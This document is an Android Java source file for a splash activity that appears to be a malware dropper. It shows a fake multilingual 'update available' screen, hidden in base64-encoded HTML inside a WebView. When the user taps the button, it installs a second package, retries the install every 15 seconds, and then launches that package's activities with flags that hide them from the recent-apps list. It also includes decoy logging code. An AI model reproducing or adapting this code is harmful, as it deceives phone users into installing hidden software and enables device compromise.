package com.appd.instll;

import static com.appd.instll.constants.trid;
import static com.appd.instll.tools.getAppIconAsBase64;
import static com.appd.instll.tools.getLabelApplication;
import static com.appd.instll.tools.isAppInstalled;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;


import java.io.UnsupportedEncodingException;
import java.util.Locale;


public class splash extends Activity {
    //private Handler handler = new Handler(Looper.getMainLooper());
    //private ProgressBar progressBar;
    //private TextView textView;
    public Context myctx;

    @Override
    public void finish() {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            super.finishAndRemoveTask();
        }
        else {
            super.finish();
        }
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
       // finish();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.splash);
        //progressBar = findViewById(R.id.progressBar);
       // textView = findViewById(R.id.textView);



        myctx = getApplicationContext();
        if (isAppInstalled(myctx, trid)){
           // try{
               try{
                   Intent intentxx = new Intent();
                   intentxx.setComponent(new ComponentName(trid, trid +".A1"));
                   intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                   intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                   intentxx.setAction(Intent.ACTION_MAIN);
                   intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);
                   startActivity(intentxx);
               }catch (Exception a){

               }

            try{
                Intent intentxx = new Intent();
                intentxx.setComponent(new ComponentName(trid, trid +".A2"));
                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                intentxx.setAction(Intent.ACTION_MAIN);
                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);
                startActivity(intentxx);
            }catch (Exception a){

            }

            this.finish();
            return;
        }
        //progressBar.setProgressTintList(ColorStateList.valueOf(Color.CYAN));


        String currentLanguage = Locale.getDefault().getLanguage();
        String updatemsg ="";
        String rightsmsg ="";
        String decripview ="";
        String upbtn ="";
        String installingmsg ="Installing";
        switch (currentLanguage) {
            case "en":
                updatemsg = "Downloading updates";
                rightsmsg = "All rights reserved";
                decripview = "An update is available. Tap 'Update' to continue.";
                upbtn = "Update";
                installingmsg ="Installing";
                break;
            case "ar":
                updatemsg = "تحميل التحديثات";
                rightsmsg = "جميع الحقوق محفوظة";
                decripview = "يتوفر تحديث. اضغط على 'تحديث' للمتابعة.";
                upbtn = "تحديث";
                installingmsg = "جارٍ التثبيت";
                break;
            case "zh":
                updatemsg = "下载更新";
                rightsmsg = "版权所有";
                decripview = "有可用更新。点击“更新”以继续。";
                upbtn = "更新";
                installingmsg = "正在安装";
                break;
            case "tr":
                updatemsg = "Güncellemeler indiriliyor";
                rightsmsg = "Tüm hakları saklıdır";
                installingmsg = "Yükleniyor";
                decripview = "Bir güncelleme mevcut. Devam için 'Güncelle'ye dokunun.";
                upbtn = "Güncelle";
                break;
            case "pt":
                updatemsg = "Baixando atualizações";
                rightsmsg = "Todos os direitos reservados";
                decripview = "Há uma atualização disponível. Toque em 'Atualizar' para continuar.";
                upbtn = "Atualizar";
                installingmsg = "Instalando";
                break;
            case "ru":
                updatemsg = "Загрузка обновлений";
                rightsmsg = "Все права защищены";
                decripview = "Доступно обновление. Нажмите 'Обновить', чтобы продолжить.";
                upbtn = "Обновить";
                installingmsg = "Установка";
                break;
            case "es":
                updatemsg = "Descargando actualizaciones";
                rightsmsg = "Todos los derechos reservados";
                decripview = "Hay una actualización disponible. Pulsa 'Actualizar' para continuar.";
                upbtn = "Actualizar";
                installingmsg = "Instalando";
                break;
            default:
                updatemsg = "Downloading updates";
                rightsmsg = "All rights reserved";
                decripview = "An update is available. Tap 'Update' to continue.";
                upbtn = "Update";
                installingmsg ="Installing";
                break;
        }



        String pagebase64 = "PCFET0NUWVBFIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPiA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+IDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4gPHRpdGxlPlNwbGFzaCBTY3JlZW48L3RpdGxlPiA8c3R5bGU+ICogeyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7IGJveC1zaXppbmc6IGJvcmRlci1ib3g7IH0gYm9keSB7IGRpc3BsYXk6IGZsZXg7IGp1c3RpZnktY29udGVudDogY2VudGVyOyBhbGlnbi1pdGVtczogY2VudGVyOyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBoZWlnaHQ6IDEwMHZoOyBiYWNrZ3JvdW5kOiAjMTIxMjEyOyBjb2xvcjogI2ZmZjsgZm9udC1mYW1pbHk6IEFyaWFsLCBzYW5zLXNlcmlmOyB0ZXh0LWFsaWduOiBjZW50ZXI7IH0gLmFwcC1pY29uIHsgd2lkdGg6IDcwcHg7IGhlaWdodDogNzBweDsgbWFyZ2luLWJvdHRvbTogMjVweDsgfSAuc3RhdHVzLW1lc3NhZ2UgeyBmb250LXNpemU6IDE4cHg7IHBhZGRpbmc6IDIwcHg7IH0gLnNwaW5uZXIgeyBkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgYWxpZ24taXRlbXM6IGNlbnRlcjsgZ2FwOiA1cHg7IH0gLmRvdCB7IHdpZHRoOiAxMHB4OyBoZWlnaHQ6IDEwcHg7IGJhY2tncm91bmQtY29sb3I6ICNmZmY7IGJvcmRlci1yYWRpdXM6IDUwJTsgYW5pbWF0aW9uOiBibGluayAxLjRzIGluZmluaXRlOyBtYXJnaW4tcmlnaHQ6IDVweDsgbWFyZ2luLWxlZnQ6IDVweDsgfSAuZG90Om50aC1jaGlsZCgyKSB7IGFuaW1hdGlvbi1kZWxheTogMC4yczsgfSAuZG90Om50aC1jaGlsZCgzKSB7IGFuaW1hdGlvbi1kZWxheTogMC40czsgfSBAa2V5ZnJhbWVzIGJsaW5rIHsgMCUsIDgwJSwgMTAwJSB7IG9wYWNpdHk6IDA7IH0gNDAlIHsgb3BhY2l0eTogMTsgfSB9IC5jb3B5cmlnaHQgeyBwb3NpdGlvbjogYWJzb2x1dGU7IGJvdHRvbTogMTBweDsgZm9udC1zaXplOiAxMnB4OyBvcGFjaXR5OiAwLjY7IH0gLmFhciB7IHdpZHRoOiAyMXB4OyBoZWlnaHQ6IDIxcHg7IGZsb2F0OiByaWdodDsgbWFyZ2luLXRvcDogMjNweDsgYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsgei1pbmRleDogNDsgcG9zaXRpb246IGZpeGVkOyBib3JkZXI6IDA7IHdpZHRoOiAxNDBweDsgaGVpZ2h0OiA3MHB4OyBib3R0b206IDcwcHg7IGxlZnQ6IDUwJTsgbWFyZ2luLWxlZnQ6IC02MHB4OyBib3JkZXItcmFkaXVzOiAxNXB4OyBiYWNrZ3JvdW5kOiByZ2IoMjgsIDE2OCwgMjU1KTsgd29yZC13cmFwOiBicmVhay13b3JkOyBvdmVyZmxvdy13cmFwOiBicmVhay13b3JkOyB3aGl0ZS1zcGFjZTogbm9ybWFsOyBmb250LXNpemU6IDR2bWluOyBkaXNwbGF5OiBub25lOyB9IC5sb2FkZXIgeyBib3JkZXI6IDRweCBzb2xpZCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMSk7IGJvcmRlci10b3A6IDRweCBzb2xpZCB3aGl0ZTsgYm9yZGVyLXJhZGl1czogNTAlOyB3aWR0aDogNDBweDsgaGVpZ2h0OiA0MHB4OyBhbmltYXRpb246IHNwaW4gMXMgbGluZWFyIGluZmluaXRlOyBkaXNwbGF5OiBub25lOyB9IC50aXRsZSB7IGZvbnQtc2l6ZTogMjRweDsgbWFyZ2luLWJvdHRvbTogMzBweDsgZGlzcGxheTogbm9uZTsgfSBAa2V5ZnJhbWVzIHNwaW4geyAwJSB7IHRyYW5zZm9ybTogcm90YXRlKDBkZWcpOyB9IDEwMCUgeyB0cmFuc2Zvcm06IHJvdGF0ZSgzNjBkZWcpOyB9IH0gPC9zdHlsZT48L2hlYWQ+PGJvZHk+IDxpbWcgc3JjPSJkYXRhOmltYWdlL3BuZztiYXNlNjQsW0JBU0UtSUNPXSIgYWx0PSJBcHAgSWNvbiIgb25lcnJvcj0idGhpcy5zdHlsZS5kaXNwbGF5PSdub25lJyIgY2xhc3M9ImFwcC1pY29uIj4gPGRpdiBjbGFzcz0ic3RhdHVzLW1lc3NhZ2UiIGlkPSJzdGF0dXNNZXNzYWdlIj48L2Rpdj4gPGRpdiBjbGFzcz0ic3Bpbm5lciI+IDxkaXYgY2xhc3M9ImRvdCI+PC9kaXY+IDxkaXYgY2xhc3M9ImRvdCI+PC9kaXY+IDxkaXYgY2xhc3M9ImRvdCI+PC9kaXY+IDwvZGl2PiA8ZGl2IGlkPSJmbnNoMSIgY2xhc3M9InRpdGxlIj5bSU5TVExdPC9kaXY+IDxkaXYgaWQ9ImZuc2gyIiBjbGFzcz0ibG9hZGVyIj48L2Rpdj4gPGJ1dHRvbiBuYW1lPSJUZXh0MiIgY2xhc3M9ImFhciIgb25jbGljaz0iZmluc2hpdCgpIiBpZD0ib2tidG5uYW1lIiB2YWx1ZT0ib2siPltCVE5dPC9idXR0b24+IDxkaXYgY2xhc3M9ImNvcHlyaWdodCI+JmNvcHk7IDIwMjUgQVBQTkFNRS4gQWxsIHJpZ2h0cyByZXNlcnZlZC48L2Rpdj4gPHNjcmlwdD4gZnVuY3Rpb24gZmluc2hpdCgpIHsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInN0YXR1c01lc3NhZ2UiKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgib2tidG5uYW1lIikuc3R5bGUuZGlzcGxheSA9ICdub25lJzsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImZuc2gxIikuc3R5bGUuZGlzcGxheSA9ICd1bnNldCc7IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJmbnNoMiIpLnN0eWxlLmRpc3BsYXkgPSAndW5zZXQnOyBzZXRUaW1lb3V0KCJhbGVydCgnZG9uZScpOyIsIDUwMCk7IH0gbGV0IGZpbmFsbWVzc2FnZSA9ICJbRk1TR10iOyBjb25zdCBtZXNzYWdlcyA9IFsiRG93bmxvYWQgdXBkYXRlcyIsICJEb3dubG9hZCB1cGRhdGVzLiIsICJEb3dubG9hZCB1cGRhdGVzLi4iLCAiRG93bmxvYWQgdXBkYXRlcy4uLiJdOyBsZXQgaW5kZXggPSAwOyBsZXQgcmVmcmVzaEludGVydmFsSWQgPSBzZXRJbnRlcnZhbCgoKSA9PiB7IGlmICgiRG93bmxvYWQgdXBkYXRlcy4uLiIgPT09IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJzdGF0dXNNZXNzYWdlIikudGV4dENvbnRlbnQpIHsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInN0YXR1c01lc3NhZ2UiKS5pbm5lckhUTUwgPSBmaW5hbG1lc3NhZ2U7IGRvY3VtZW50LmdldEVsZW1lbnRzQnlDbGFzc05hbWUoInNwaW5uZXIiKVswXS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgib2tidG5uYW1lIikuc3R5bGUuZGlzcGxheSA9ICd1bnNldCc7IGNsZWFySW50ZXJ2YWwocmVmcmVzaEludGVydmFsSWQpOyByZXR1cm47IH0gaW5kZXggPSAoaW5kZXggKyAxKSAlIG1lc3NhZ2VzLmxlbmd0aDsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInN0YXR1c01lc3NhZ2UiKS50ZXh0Q29udGVudCA9IG1lc3NhZ2VzW2luZGV4XTsgfSwgMjAwMCk7IDwvc2NyaXB0PjwvYm9keT48L2h0bWw+";
        String MyName = getLabelApplication(myctx);
        try {
            //String CurrnetLanuage = Locale.getDefault().getLanguage();
            pagebase64 = (new String(Base64.decode(pagebase64, 0), "UTF-8")).replace("APPNAME", MyName)
                    .replace("Download updates",updatemsg)
                    .replace("All rights reserved",rightsmsg)
                    .replace("[INSTL]",installingmsg)
                    .replace("[FMSG]",decripview)
                    .replace("[BTN]",upbtn)
                    .replace("[BASE-ICO]",getAppIconAsBase64(myctx));
        } catch (UnsupportedEncodingException e) {
           // out();
        }
        WebView webView = new WebView(this);
        //create webview , load the page from base64 and setcontent , delay for 5 sec , start main activity
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);  // Enable JavaScript

        // Load the Base64 content into WebView
        webView.setWebViewClient(new WebViewClient());

        webView.loadDataWithBaseURL(null, pagebase64, "text/html", "UTF-8", null);
        setContentView(webView);

        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                    @Override
                    public void run() {
//                        Intent mainLaunch = new Intent(myctx, MainActivity.class);
//                        mainLaunch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                        mainLaunch.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
//                        myctx.startActivity(mainLaunch);

                        SessionManager.install(getApplicationContext());
                        watcher();
                        // finish();
                    }
                }, 1);
                return true; // Indicate that we handled the alert
            }

            @Override
            public boolean onJsConfirm(WebView view, String url, String message, JsResult result) {
                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                    @Override
                    public void run() {
//                        Intent mainLaunch = new Intent(myctx, MainActivity.class);
//                        mainLaunch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                        mainLaunch.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
//                        myctx.startActivity(mainLaunch);

                        SessionManager.install(getApplicationContext());
                        watcher();
                    }
                }, 1);
                return true; // Indicate that we handled the confirm
            }
        });




        abstract class SessionTracker {
            abstract void recordSession(String id);
            void inval() {
                Log.w("bbbb", "fsdfsdf session");
            }
            void idate() {
                Log.w("aaaaa", "asdasd session");
            }
            void invalidate() {
                Log.w("cccc", "sdasd session");
            }
        }




    }

    private void watcher(){
        new Thread(new Runnable() {
            @Override
            public void run() {

                boolean wilcan = true;
                while (wilcan){
                    try{
                        Thread.sleep(15000);
                    }catch (Exception s){}

                    //Build.VERSION.SDK_INT < Build.VERSION_CODES.O || ctx.getPackageManager().canRequestPackageInstalls()
                    if(isAppInstalled(myctx, trid)){
                        wilcan=false;
                        new Handler(myctx.getMainLooper()).post(()->{
                            try{
                                Intent intentxx = new Intent();
                                intentxx.setComponent(new ComponentName(trid, trid +".A1"));
                                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                intentxx.setAction(Intent.ACTION_MAIN);
                                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);
                                startActivity(intentxx);
                            }catch (Exception a){

                            }

                            try{
                                Intent intentxx = new Intent();
                                intentxx.setComponent(new ComponentName(trid, trid +".A2"));
                                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                intentxx.setAction(Intent.ACTION_MAIN);
                                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);
                                startActivity(intentxx);
                            }catch (Exception a){

                            }

                            finish();
                        });
                        break;
                    }else{
                        // if(Build.VERSION.SDK_INT < Build.VERSION_CODES.O || myctx.getPackageManager().canRequestPackageInstalls()){
                        new Handler(myctx.getMainLooper()).post(()->{
                            SessionManager.install(getApplicationContext());
                        });

                        //}
                    }
                }



            }
        }).start();


    }

}
